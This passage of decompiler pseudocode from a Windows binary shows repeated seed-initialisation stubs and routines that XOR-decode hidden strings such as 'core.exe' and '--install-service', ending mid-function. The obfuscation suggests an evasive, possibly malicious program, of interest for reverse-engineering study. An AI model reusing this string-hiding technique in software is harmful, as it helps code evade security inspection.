__int64 sub_1400035D0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD55C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD55C: using guessed type int dword_1400DD55C;

//----- (00000001400035F0) ----------------------------------------------------
__int64 sub_1400035F0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD564 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD564: using guessed type int dword_1400DD564;

//----- (0000000140003610) ----------------------------------------------------
__int64 sub_140003610()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD558 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD558: using guessed type int dword_1400DD558;

//----- (0000000140003630) ----------------------------------------------------
__int64 sub_140003630()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD574 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD574: using guessed type int dword_1400DD574;

//----- (0000000140003650) ----------------------------------------------------
__int64 sub_140003650()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD570 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD570: using guessed type int dword_1400DD570;

//----- (0000000140003670) ----------------------------------------------------
__int64 sub_140003670()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD578 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD578: using guessed type int dword_1400DD578;

//----- (0000000140003690) ----------------------------------------------------
__int64 sub_140003690()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD56C = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD56C: using guessed type int dword_1400DD56C;

//----- (00000001400036B0) ----------------------------------------------------
__int64 sub_1400036B0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD588 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD588: using guessed type int dword_1400DD588;

//----- (00000001400036D0) ----------------------------------------------------
__int64 sub_1400036D0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD584 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD584: using guessed type int dword_1400DD584;

//----- (00000001400036F0) ----------------------------------------------------
__int64 sub_1400036F0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD58C = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD58C: using guessed type int dword_1400DD58C;

//----- (0000000140003710) ----------------------------------------------------
__int64 sub_140003710()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD580 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD580: using guessed type int dword_1400DD580;

//----- (0000000140003730) ----------------------------------------------------
__int64 sub_140003730()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD59C = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD59C: using guessed type int dword_1400DD59C;

//----- (0000000140003750) ----------------------------------------------------
__int64 sub_140003750()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD598 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD598: using guessed type int dword_1400DD598;

//----- (0000000140003770) ----------------------------------------------------
__int64 sub_140003770()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5A0 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5A0: using guessed type int dword_1400DD5A0;

//----- (0000000140003790) ----------------------------------------------------
__int64 sub_140003790()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD594 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD594: using guessed type int dword_1400DD594;

//----- (00000001400037B0) ----------------------------------------------------
__int64 sub_1400037B0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5B0 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5B0: using guessed type int dword_1400DD5B0;

//----- (00000001400037D0) ----------------------------------------------------
__int64 sub_1400037D0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5AC = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5AC: using guessed type int dword_1400DD5AC;

//----- (00000001400037F0) ----------------------------------------------------
__int64 sub_1400037F0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5B4 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5B4: using guessed type int dword_1400DD5B4;

//----- (0000000140003810) ----------------------------------------------------
__int64 sub_140003810()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5A8 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5A8: using guessed type int dword_1400DD5A8;

//----- (0000000140003830) ----------------------------------------------------
__int64 sub_140003830()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5C4 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5C4: using guessed type int dword_1400DD5C4;

//----- (0000000140003850) ----------------------------------------------------
__int64 sub_140003850()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5C0 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5C0: using guessed type int dword_1400DD5C0;

//----- (0000000140003870) ----------------------------------------------------
__int64 sub_140003870()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5C8 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5C8: using guessed type int dword_1400DD5C8;

//----- (0000000140003890) ----------------------------------------------------
__int64 sub_140003890()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5BC = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5BC: using guessed type int dword_1400DD5BC;

//----- (00000001400038B0) ----------------------------------------------------
__int64 sub_1400038B0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5D8 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5D8: using guessed type int dword_1400DD5D8;

//----- (00000001400038D0) ----------------------------------------------------
__int64 sub_1400038D0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5D4 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5D4: using guessed type int dword_1400DD5D4;

//----- (00000001400038F0) ----------------------------------------------------
__int64 sub_1400038F0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5DC = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5DC: using guessed type int dword_1400DD5DC;

//----- (0000000140003910) ----------------------------------------------------
__int64 sub_140003910()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5D0 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5D0: using guessed type int dword_1400DD5D0;

//----- (0000000140003930) ----------------------------------------------------
__int64 sub_140003930()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5FC = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5FC: using guessed type int dword_1400DD5FC;

//----- (0000000140003950) ----------------------------------------------------
__int64 sub_140003950()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5F8 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5F8: using guessed type int dword_1400DD5F8;

//----- (0000000140003970) ----------------------------------------------------
__int64 sub_140003970()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD600 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD600: using guessed type int dword_1400DD600;

//----- (0000000140003990) ----------------------------------------------------
__int64 sub_140003990()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD5F4 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD5F4: using guessed type int dword_1400DD5F4;

//----- (00000001400039B0) ----------------------------------------------------
__int64 sub_1400039B0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD610 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD610: using guessed type int dword_1400DD610;

//----- (00000001400039D0) ----------------------------------------------------
__int64 sub_1400039D0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD60C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD60C: using guessed type int dword_1400DD60C;

//----- (00000001400039F0) ----------------------------------------------------
__int64 sub_1400039F0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD614 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD614: using guessed type int dword_1400DD614;

//----- (0000000140003A10) ----------------------------------------------------
__int64 sub_140003A10()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD608 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD608: using guessed type int dword_1400DD608;

//----- (0000000140003A30) ----------------------------------------------------
__int64 sub_140003A30()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD624 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD624: using guessed type int dword_1400DD624;

//----- (0000000140003A50) ----------------------------------------------------
__int64 sub_140003A50()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD620 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD620: using guessed type int dword_1400DD620;

//----- (0000000140003A70) ----------------------------------------------------
__int64 sub_140003A70()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD628 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD628: using guessed type int dword_1400DD628;

//----- (0000000140003A90) ----------------------------------------------------
__int64 sub_140003A90()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD61C = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD61C: using guessed type int dword_1400DD61C;

//----- (0000000140003AB0) ----------------------------------------------------
__int64 sub_140003AB0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD638 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD638: using guessed type int dword_1400DD638;

//----- (0000000140003AD0) ----------------------------------------------------
__int64 sub_140003AD0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD634 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD634: using guessed type int dword_1400DD634;

//----- (0000000140003AF0) ----------------------------------------------------
__int64 sub_140003AF0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD63C = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD63C: using guessed type int dword_1400DD63C;

//----- (0000000140003B10) ----------------------------------------------------
__int64 sub_140003B10()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD630 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD630: using guessed type int dword_1400DD630;

//----- (0000000140003B30) ----------------------------------------------------
__int64 sub_140003B30()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD64C = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD64C: using guessed type int dword_1400DD64C;

//----- (0000000140003B50) ----------------------------------------------------
__int64 sub_140003B50()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD648 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD648: using guessed type int dword_1400DD648;

//----- (0000000140003B70) ----------------------------------------------------
__int64 sub_140003B70()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD650 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD650: using guessed type int dword_1400DD650;

//----- (0000000140003B90) ----------------------------------------------------
__int64 sub_140003B90()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD644 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD644: using guessed type int dword_1400DD644;

//----- (0000000140003BB0) ----------------------------------------------------
__int64 sub_140003BB0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD660 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD660: using guessed type int dword_1400DD660;

//----- (0000000140003BD0) ----------------------------------------------------
__int64 sub_140003BD0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD65C = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD65C: using guessed type int dword_1400DD65C;

//----- (0000000140003BF0) ----------------------------------------------------
__int64 sub_140003BF0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD664 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD664: using guessed type int dword_1400DD664;

//----- (0000000140003C10) ----------------------------------------------------
__int64 sub_140003C10()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DD658 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DD658: using guessed type int dword_1400DD658;

//----- (0000000140003C30) ----------------------------------------------------
void __fastcall sub_140003C30(void *Src, _QWORD *a2)
{
  __int64 v2; // rsi
  _QWORD *v3; // rbp
  char *v4; // rbx
  unsigned __int64 v5; // rax
  char *v6; // rdi
  __int64 v7; // rax

  v2 = *((_QWORD *)Src + 2);
  v3 = a2;
  v4 = (char *)Src;
  if ( v2 )
  {
    v5 = *((_QWORD *)Src + 3);
    if ( v5 < 0x10 )
      v6 = (char *)Src;
    else
      v6 = *(char **)Src;
    if ( v5 >= 0x10 )
      v4 = *(char **)Src;
    v7 = sub_140031970(Src, a2);
    sub_140030C60(v4, &v6[v2], v3, v7);
  }
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (0000000140003CA0) ----------------------------------------------------
__int64 __fastcall sub_140003CA0(__int64 a1)
{
  return a1;
}

//----- (0000000140003CB0) ----------------------------------------------------
_QWORD *__fastcall sub_140003CB0(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rdi

  a1[3] = 15i64;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  v2 = a2;
  v3 = a1;
  if ( a2[3] >= 0x10ui64 )
  {
    *a1 = *a2;
    *a2 = 0i64;
  }
  else if ( a2[2] != -1i64 )
  {
    memmove(a1, a2, a2[2] + 1i64);
  }
  v3[2] = v2[2];
  v3[3] = v2[3];
  v2[3] = 15i64;
  v2[2] = 0i64;
  *(_BYTE *)v2 = 0;
  return v3;
}

//----- (0000000140003D30) ----------------------------------------------------
_QWORD *__fastcall sub_140003D30(_QWORD *a1, _BYTE *a2)
{
  size_t v2; // r8
  _QWORD *v3; // rbx

  v2 = 0i64;
  a1[3] = 15i64;
  v3 = a1;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  if ( *a2 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( a2[v2] );
  }
  sub_140004F20(a1, a2, v2);
  return v3;
}

//----- (0000000140003DA0) ----------------------------------------------------
__int64 __fastcall sub_140003DA0(volatile signed __int32 **a1)
{
  volatile signed __int32 *v1; // rbx
  __int64 result; // rax

  v1 = *a1;
  if ( *a1 && !_InterlockedDecrement(v1 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 8i64))(v1);
    if ( !_InterlockedDecrement(v1 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 16i64))(v1);
  }
  return result;
}

//----- (0000000140003DE0) ----------------------------------------------------
_QWORD *__fastcall sub_140003DE0(void *Src, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // rdi
  _QWORD *v5; // rax
  void *Srca; // [rsp+30h] [rbp-48h]
  __int64 v8; // [rsp+40h] [rbp-38h]
  unsigned __int64 v9; // [rsp+48h] [rbp-30h]

  v3 = a3;
  v4 = Src;
  v9 = 7i64;
  v8 = 0i64;
  LOWORD(Srca) = 0;
  sub_140005050(&Srca, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v5 = sub_140031640(&Srca, v3);
  v4[3] = 7i64;
  v4[2] = 0i64;
  *(_WORD *)v4 = 0;
  sub_140005050(v4, v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v9 >= 8 )
    operator delete(Srca);
  return v4;
}

//----- (0000000140003E90) ----------------------------------------------------
_QWORD *__fastcall sub_140003E90(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &loc_1400A27F0;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}

//----- (0000000140003EC0) ----------------------------------------------------
__int64 sub_140003EC0()
{
  _QWORD *v0; // rax
  unsigned __int8 v1; // di
  volatile signed __int32 *v2; // rbx
  __int64 v4; // [rsp+20h] [rbp-48h]
  volatile signed __int32 *v5; // [rsp+28h] [rbp-40h]
  __int64 v6; // [rsp+30h] [rbp-38h]
  void *Src; // [rsp+38h] [rbp-30h]
  __int64 v8; // [rsp+48h] [rbp-20h]
  unsigned __int64 v9; // [rsp+50h] [rbp-18h]

  v6 = -2i64;
  v0 = sub_1400043C0(&Src);
  sub_140008900((__int64)&v4, v0);
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  if ( v4 && sub_140007800(v4) )
  {
    sub_140007BA0(v4);
    v1 = 1;
  }
  else
  {
    v1 = 0;
  }
  v2 = v5;
  if ( v5 )
  {
    if ( !_InterlockedDecrement(v5 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  return v1;
}

//----- (0000000140003FA0) ----------------------------------------------------
_QWORD *__fastcall sub_140003FA0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D98D8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D98D8 & 1 )
  {
    v5 = byte_1400D98D4;
  }
  else
  {
    v4 = 69069 * dword_1400D98AC + 1234567;
    v1 = dword_1400D98D8 | 1;
    dword_1400D98AC = v4;
    dword_1400D98D8 |= 1u;
    dword_1400D98A4 = HIWORD(dword_1400D98A4) + 36969 * (unsigned __int16)dword_1400D98A4;
    LOBYTE(v4) = (BYTE2(dword_1400D98B0) + 80 * dword_1400D98B0) ^ v4;
    dword_1400D98B0 = HIWORD(dword_1400D98B0) + 18000 * (unsigned __int16)dword_1400D98B0;
    v5 = (((unsigned int)dword_1400D98A8 >> 13) ^ 32 * dword_1400D98A8 ^ dword_1400D98A8) + v4;
    dword_1400D98A8 ^= ((unsigned int)dword_1400D98A8 >> 13) ^ 32 * (dword_1400D98A8 ^ (dword_1400D98A8 << 12));
    byte_1400D98D4 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D98D8 = v1 | 2;
    byte_1400D98E0[0] = v5 ^ 0x63;
    byte_1400D98E1 = (v5 - 1) ^ 0x6F;
    byte_1400D98E2 = (v5 - 2) ^ 0x72;
    byte_1400D98E3 = (v5 - 3) ^ 0x65;
    byte_1400D98E4 = (v5 - 4) ^ 0x2E;
    byte_1400D98E5 = (v5 - 5) ^ 0x65;
    byte_1400D98E6 = (v5 - 6) ^ 0x78;
    byte_1400D98E7 = (v5 - 7) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400D98D4;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D98E0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400D98A4: using guessed type int dword_1400D98A4;
// 1400D98A8: using guessed type int dword_1400D98A8;
// 1400D98AC: using guessed type int dword_1400D98AC;
// 1400D98B0: using guessed type int dword_1400D98B0;
// 1400D98D4: using guessed type char byte_1400D98D4;
// 1400D98D8: using guessed type int dword_1400D98D8;
// 1400D98E1: using guessed type char byte_1400D98E1;
// 1400D98E2: using guessed type char byte_1400D98E2;
// 1400D98E3: using guessed type char byte_1400D98E3;
// 1400D98E4: using guessed type char byte_1400D98E4;
// 1400D98E5: using guessed type char byte_1400D98E5;
// 1400D98E6: using guessed type char byte_1400D98E6;
// 1400D98E7: using guessed type char byte_1400D98E7;

//----- (0000000140004170) ----------------------------------------------------
_QWORD *__fastcall sub_140004170(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D98EC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D98EC & 1 )
  {
    v5 = byte_1400D98E8;
  }
  else
  {
    v4 = 69069 * dword_1400D98AC + 1234567;
    v1 = dword_1400D98EC | 1;
    dword_1400D98AC = v4;
    dword_1400D98EC |= 1u;
    dword_1400D98A4 = HIWORD(dword_1400D98A4) + 36969 * (unsigned __int16)dword_1400D98A4;
    LOBYTE(v4) = (BYTE2(dword_1400D98B0) + 80 * dword_1400D98B0) ^ v4;
    dword_1400D98B0 = HIWORD(dword_1400D98B0) + 18000 * (unsigned __int16)dword_1400D98B0;
    v5 = (((unsigned int)dword_1400D98A8 >> 13) ^ 32 * dword_1400D98A8 ^ dword_1400D98A8) + v4;
    dword_1400D98A8 ^= ((unsigned int)dword_1400D98A8 >> 13) ^ 32 * (dword_1400D98A8 ^ (dword_1400D98A8 << 12));
    byte_1400D98E8 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D98EC = v1 | 2;
    byte_1400D98F0[0] = v5 ^ 0x2D;
    byte_1400D98F1 = (v5 - 1) ^ 0x2D;
    byte_1400D98F2 = (v5 - 2) ^ 0x69;
    byte_1400D98F3 = (v5 - 3) ^ 0x6E;
    byte_1400D98F4 = (v5 - 4) ^ 0x73;
    byte_1400D98F5 = (v5 - 5) ^ 0x74;
    byte_1400D98F6 = (v5 - 6) ^ 0x61;
    byte_1400D98F7 = (v5 - 7) ^ 0x6C;
    byte_1400D98F8 = (v5 - 8) ^ 0x6C;
    byte_1400D98F9 = (v5 - 9) ^ 0x2D;
    byte_1400D98FA = (v5 - 10) ^ 0x73;
    byte_1400D98FB = (v5 - 11) ^ 0x65;
    byte_1400D98FC = (v5 - 12) ^ 0x72;
    byte_1400D98FD = (v5 - 13) ^ 0x76;
    byte_1400D98FE = (v5 - 14) ^ 0x69;
    byte_1400D98FF = (v5 - 15) ^ 0x63;
    byte_1400D9900 = (v5 - 16) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x11ui64 )
  {
    sub_140004790(Src, 0x11ui64, 0i64);
    v5 = byte_1400D98E8;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  *((_BYTE *)v6 + 16) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 17i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 17) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D98F0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x11 );
  return v3;
}
// 1400D98A4: using guessed type int dword_1400D98A4;
// 1400D98A8: using guessed type int dword_1400D98A8;
// 1400D98AC: using guessed type int dword_1400D98AC;
// 1400D98B0: using guessed type int dword_1400D98B0;
// 1400D98E8: using guessed type char byte_1400D98E8;
// 1400D98EC: using guessed type int dword_1400D98EC;
// 1400D98F1: using guessed type char byte_1400D98F1;
// 1400D98F2: using guessed type char byte_1400D98F2;
// 1400D98F3: using guessed type char byte_1400D98F3;
// 1400D98F4: using guessed type char byte_1400D98F4;
// 1400D98F5: using guessed type char byte_1400D98F5;
// 1400D98F6: using guessed type char byte_1400D98F6;
// 1400D98F7: using guessed type char byte_1400D98F7;
// 1400D98F8: using guessed type char byte_1400D98F8;
// 1400D98F9: using guessed type char byte_1400D98F9;
// 1400D98FA: using guessed type char byte_1400D98FA;
// 1400D98FB: using guessed type char byte_1400D98FB;
// 1400D98FC: using guessed type char byte_1400D98FC;
// 1400D98FD: using guessed type char byte_1400D98FD;
// 1400D98FE: using guessed type char byte_1400D98FE;
// 1400D98FF: using guessed type char byte_1400D98FF;
// 1400D9900: using guessed type char byte_1400D9900;

//----- (00000001400043C0) ----------------------------------------------------
_DWORD *__fastcall sub_1400043C0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _DWORD *v6; // rax
  bool v7; // cf
  _DWORD *v8; // rax
  __int64 v9; // rdx
  _DWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D98CC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D98CC & 1 )
